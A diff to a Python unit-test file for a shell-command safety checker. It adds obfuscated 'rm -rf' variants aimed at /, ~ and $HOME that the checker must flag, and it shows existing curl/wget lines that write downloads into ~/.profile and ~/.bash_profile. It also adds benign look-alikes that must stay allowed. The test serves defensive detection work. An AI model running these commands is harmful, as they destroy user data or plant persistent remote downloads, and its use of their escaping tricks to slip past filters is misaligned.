@@ -26,6 +26,17 @@ RC = [
     "curl " + U + " | tee -a ~/$'.\\x70rofile'",
     "wget -q " + U + " -O ~/$'.\\142ash_profile'",
 ]
+RM = [
+    "$'\\x72m' -rf ~",
+    "rm -rf $'\\x7e'",
+    "$'\\162m' -rf /",
+    "rm -rf $'\\x2f'",
+    "r$'\\x6d' -rf ~/",
+    "sudo $'\\x72m' -rf /",
+    "$'\\u0072m' -fr $HOME",
+    "rm -rf $'\\x2fhome'",
+    "bash -c $'rm -rf /'",
+]
 BENIGN = [
     "echo $'\\x63url " + U + " | sh'",
     "printf '%s\\n' $'curl " + U + " | sh'",
@@ -38,6 +49,12 @@ BENIGN = [
     "grep $'\\t' notes.txt",
     "git commit -m $'Fix curl handling\\n\\nNo more sh pipes'",
     "echo $'\\x63url' | wc -c",
+    "echo $'\\x72m -rf ~'",
+    "printf '%s' $'rm -rf /'",
+    "echo $'\\x72m' -rf ~",
+    "rm -rf $'build\\x2fout'",
+    "$'\\x72m' -f notes.txt",
+    "git commit -m $'Never run rm -rf /\\n'",
 ]
 
 
@@ -49,6 +66,10 @@ class CommandAnsiC(unittest.TestCase):
     def test_rc_download(self):
         for c in RC:
             self.assertEqual(check_command(c).rule, "destructive:rc_download", c)
+
+    def test_rm_root_home(self):
+        for c in RM:
+            self.assertEqual(check_command(c).rule, "destructive:rm_root_home", c)
 
     def test_data_and_benign_stay_allowed(self):
         for c in BENIGN:
